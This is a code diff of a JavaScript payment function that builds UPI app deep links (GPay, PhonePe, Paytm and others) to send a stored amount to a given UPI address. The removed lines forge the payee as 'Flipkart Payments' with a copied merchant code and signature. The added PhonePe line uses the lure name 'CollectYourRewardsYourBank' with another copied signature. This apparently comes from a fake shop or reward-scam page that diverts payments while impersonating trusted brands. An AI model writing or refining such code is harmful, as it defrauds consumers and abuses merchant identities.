@@ -48,23 +48,19 @@ function payNow(upi_address) {
     var amt = localStorage.getItem("price");
     switch (payType) {
         case 'gpay':
-            redirect_url = "tez://upi/pay?pa=" + upi_address + "&pn=Flipkart%20Payments&mc=3526&tr=" + "&am=" + amt + "&cu=INR&tn=4520175&url=&mode=02&purpose=00&orgid=951&sign=MEYCIQC41mu+HMffQXue6e9sMxOMYEkDgPPDIL4Kw2jV2U3eYQIhAP1Ot6G4dVo0xuz26kaAWjiZXWhnxb7ve+lUFOtLIwzm";
+            redirect_url = "tez://upi/pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&cu=INR&tn=" + site_name;
             break;
 
         case 'phonepe':
-            redirect_url = "phonepe://pay?pa=" + upi_address + "&pn=Flipkart%20Payments&mc=3526&tr=" + "&am=" + amt + "&cu=INR&tn=4520175&url=&mode=02&purpose=00&orgid=951&sign=MEYCIQC41mu+HMffQXue6e9sMxOMYEkDgPPDIL4Kw2jV2U3eYQIhAP1Ot6G4dVo0xuz26kaAWjiZXWhnxb7ve+lUFOtLIwzm";
+            redirect_url = "phonepe://pay?pa=" + upi_address + "&pn=CollectYourRewardsYourBank&mc=&tn=&am=" + amt + "&cu=INR&url=&mode=02&purpose=00&orgid=159024&sign=MEYCIQCgpTe2xeoNfYGFQ8SsqsibjjRtneNFQFlmLfZYC/vC5wIhANeXald38G4FMySMNEoGC0/zfwLlPGfpNRrDrwF7d3Ex ";
             break;
 
         case 'paytm':
-            redirect_url = "phonepe://pay?pa=" + upi_address + "&pn=Flipkart%20Payments&mc=3526&tr=" + "&am=" + amt + "&cu=INR&tn=4520175&url=&mode=02&purpose=00&orgid=951&sign=MEYCIQC41mu+HMffQXue6e9sMxOMYEkDgPPDIL4Kw2jV2U3eYQIhAP1Ot6G4dVo0xuz26kaAWjiZXWhnxb7ve+lUFOtLIwzm";
+            redirect_url = "paytmmp://pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&cu=INR&tn=" + site_name;
             break;
 
-        case 'bhim_upi':
-            redirect_url = "bhim://pay?pa=" + upi_address + "&pn=Flipkart%20Payments&mc=3526&tr=" + "&am=" + amt + "&cu=INR&tn=4520175&url=&mode=02&purpose=00&orgid=951&sign=MEYCIQC41mu+HMffQXue6e9sMxOMYEkDgPPDIL4Kw2jV2U3eYQIhAP1Ot6G4dVo0xuz26kaAWjiZXWhnxb7ve+lUFOtLIwzm";
-            break;
-
-        case 'whatspp_pay':
-            redirect_url = "whatsapp://pay?pa=" + upi_address + "&pn=Flipkart%20Payments&mc=3526&tr=" + "&am=" + amt + "&cu=INR&tn=4520175&url=&mode=02&purpose=00&orgid=951&sign=MEYCIQC41mu+HMffQXue6e9sMxOMYEkDgPPDIL4Kw2jV2U3eYQIhAP1Ot6G4dVo0xuz26kaAWjiZXWhnxb7ve+lUFOtLIwzm";
+        case 'upi':
+            redirect_url = "upi://pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&cu=INR&tn=" + site_name;
             break;
 
         default:
